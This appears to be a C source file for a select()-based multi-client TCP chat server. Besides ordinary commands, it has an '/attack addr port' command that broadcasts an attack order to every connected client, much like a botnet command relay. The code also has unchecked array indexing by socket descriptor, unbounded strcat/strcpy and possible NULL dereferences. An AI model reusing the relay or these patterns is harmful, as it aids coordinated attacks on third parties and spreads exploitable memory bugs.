/*	linux-socket-select-Òì²œÁÄÌìÊÒ
	talk_server.c
	writed by hanzhongqiu 13/04/2009
	Using select() for I/O multiplexing 
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netdb.h>
#include <sys/time.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <unistd.h>

/* port we're listening on */
#define SERVERPORT 1574
/*maximum cnnnect number*/
#define BACKLOG 10
/*maximum data buffer*/
#define BUFSIZE 2048

int copy(char *p1,char *p2,int m);
struct client_info
{
    int client_id;
    struct sockaddr_in client_address;
    char *name;
    int first;
};

int main()
{
    /*master file descriptor list*/
    fd_set master_fds;
    /*temple file descriptor list for select()*/
    fd_set read_fds;
    /*server address*/
    struct sockaddr_in server_addr;
    /*client address*/
    struct sockaddr_in client_addr;
    /*maximum file descriptor number*/
    int max_fd;
    /*listening socket file descriptor*/
    int sockfd;
    /*newly accept()ed socket file descreptor*/
    int newfd;
    /*buffer for saving client data*/
    char data_buf[BUFSIZE];
    char send_buf[BUFSIZE];
    /*number of client data*/
    int nbytes;
    /*for set socket option*/
    int opt;
    opt = SO_REUSEADDR;
    /*lenth of address*/
    int addr_len;
    /*for accept() to use*/
    int size;
    size = sizeof(struct sockaddr);
    /*temple varient*/
    int tmp_i, tmp_j;
    struct client_info clientinfo[BACKLOG];

    /*clear the master and temple file descriptor*/
    FD_ZERO(&master_fds);
    FD_ZERO(&read_fds);

    memset(&data_buf, 0, BUFSIZE);
    memset(&send_buf, 0, BUFSIZE);

    /*create socket*/
    if (-1 == (sockfd = socket(AF_INET, SOCK_STREAM, 0)))
    {
        perror("create socket() error:");
        exit(1);
    }
    /*set the socket*/
    if (-1 == setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)))
    {
        perror("setsockopt() error:");
        exit(1);
    }
    /*bind first config the socket then binding*/
    memset(&server_addr, 0, size);
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVERPORT);
    server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    bzero(&(server_addr.sin_zero), 8);
    if (-1 == bind(sockfd, (struct sockaddr*)&server_addr, sizeof(struct sockaddr)))
    {
        perror("bind() socket error:");
        exit(1);
    }
    /*listen */
    if (-1 == listen(sockfd, BACKLOG))
    {
        perror("listen() error:");
        exit(1);
    }
    /*add sockfd to master set*/
    FD_SET(sockfd, &master_fds);
    /*keep track the max file descriptor*/
    max_fd = sockfd;
    printf("server is ok!\n");
    /*loop*/
    while (1)
    {
        read_fds = master_fds;
        if (-1== select(max_fd + 1, &read_fds, NULL, NULL, NULL))
        {
            perror("select() error!\n");
            exit(1);
        }
        /*looking for data to read*/
        for (tmp_i = sockfd; tmp_i <= max_fd; tmp_i++)
        {
            /*got connect*/
            if (FD_ISSET(tmp_i, &read_fds))
            {
                if (tmp_i == sockfd)
                {
                    newfd = accept(sockfd, (struct sockaddr*)&client_addr, &size);
                    clientinfo[newfd].client_id = newfd;
                    clientinfo[newfd].client_address.sin_addr = client_addr.sin_addr;
                    clientinfo[newfd].first = 0;
                    if (-1 == newfd)
                    {
                        perror("accept() error:");
                        exit(1);
                    }
                    else
                    {
                        FD_SET(newfd, &master_fds);
                        if (newfd > max_fd)
                        {
                            max_fd = newfd;
                        }
                        printf("Get the new connect from %s\n", inet_ntoa(client_addr.sin_addr));
                    }
                }
                else
                {/*get data from the client*/
                    nbytes = read(tmp_i, data_buf, sizeof(data_buf));
                    if (0 > nbytes)
                    {
                        perror("recv() error:");
                        exit(1);
                    }
                    else if(nbytes == 0 || (0 == strcmp(data_buf, "/quit")))
                    {
                        printf("client: %s exit!\n", clientinfo[tmp_i].name);
                        FD_CLR(tmp_i, &master_fds);
                        close(tmp_i);
                        strcat(send_buf, clientinfo[tmp_i].name);
                        strcat(send_buf, "  was exit!");
                        for (tmp_j = sockfd + 1; tmp_j <= max_fd; tmp_j++)
                        {
                            if (FD_ISSET(tmp_j, &master_fds))
                            {

                                if (-1 == write(tmp_j, send_buf, 2048))
                                {
                                    perror("send data error:");
                                }
                            }
                        }// end for
                    } else if(clientinfo[tmp_i].first == 0)
                    {
                        clientinfo[tmp_i].first++;
                        clientinfo[tmp_i].name = (char*)malloc((nbytes+1)*sizeof(char));
                        strcpy(clientinfo[tmp_i].name,data_buf);
                        printf("%s coming ...\n", clientinfo[tmp_i].name);
                        strcat(send_buf, "username got.\n");
                        if (-1 == write(tmp_i, send_buf, 2048))
                        {
                            perror("send data error:");
                        }
                    }
                    else if(data_buf[0] == '/')
                    {
                        printf("%s\n",data_buf);
                        if(strstr(data_buf,"/attack") != NULL)
                        {
                            char *data = data_buf;
                            printf("%s",data);
                            char *addr;
                            char *port;
                            char *cmd;
                            cmd = strsep(&data," ");
                            addr = strsep(&data," ");
                            port = strsep(&data," ");
                            strcat(send_buf, "start attacking ");
			    strcat(send_buf, addr);
			    strcat(send_buf, ":");
                            strcat(send_buf, port);
                            for (tmp_j = sockfd + 1; tmp_j <= max_fd; tmp_j++)
                            {

                                if (FD_ISSET(tmp_j, &master_fds))
                                {   
                                     if (-1 == write(tmp_j, send_buf, 2048))
                                         {
                                            perror("send data error:");
                                         }
                                }
                            }// end for

                        }
                        else if(0 == strcmp(data_buf, "/help"))
                        {
                            printf("%s ask for help\n", clientinfo[tmp_i].name);
                            strcat(send_buf, "/help-----for help\n");
                            strcat(send_buf, "/quit-----for quit\n");
                            strcat(send_buf, "/who-----display all users\n");
                            strcat(send_buf, "/send name-----send message to user only\n");
                            if (-1 == write(tmp_i, send_buf, 2048))
                            {
                                perror("send data error:");
                            }
                        }
                        else if(0 == strcmp(data_buf, "/who"))
                        {
                            strcat(send_buf, "user list:\n");
                            for (tmp_j = sockfd + 1; tmp_j <= max_fd; tmp_j++)
                            {
                                if (FD_ISSET(tmp_j, &master_fds))
                                {
                                    strcat(send_buf, clientinfo[tmp_j].name);
                                    strcat(send_buf, "\n");
                                }
                            }// end for
                            if (-1 == write(tmp_i, send_buf, 2048))
                            {
                                perror("send data error:");
                            }
                        }else
                        {
                            strcat(send_buf, "wrong command\n");
                            strcat(send_buf, "/help-----for help\n");
                            strcat(send_buf, "/quit-----for quit\n");
                            strcat(send_buf, "/who-----display all users\n");
                            strcat(send_buf, "/send name-----send message to user only\n");
                            if (-1 == write(tmp_i, send_buf, 2048))
                            {
                                perror("send data error:");
                            }
                        }

                    }
                    else
                    {
                        printf("get data:%s from the user :", data_buf);
                        printf("%s\n", clientinfo[tmp_i].name);
                        strcat(send_buf, clientinfo[tmp_i].name);
                        strcat(send_buf, " said:  ");
                        strcat(send_buf, data_buf);
                        for (tmp_j = sockfd + 1; tmp_j <= max_fd; tmp_j++)
                        {
                            if (FD_ISSET(tmp_j, &master_fds))
                            {

                                if (-1 == write(tmp_j, send_buf, nbytes))
                                {
                                    perror("send data error:");
                                }
                            }
                        }// end for
                    }//end else



                }//end else
            }//end if
        }//end for

        memset(&data_buf, 0, BUFSIZE);
        memset(&send_buf, 0, BUFSIZE);
        //FD_ZERO(&master_fds);
        //FD_SET(sockfd, &master_fds);
    }//end while

    return 0;
}

int copy(char *p1,char *p2,int m)
{

    int n;
    n=0;
    while(n<m-1)
    {
        n++;
        p1++;
    }
    while(*p1!='\0')
    {
        *p2=*p1;

        p1++;
        p2++;
    }
}
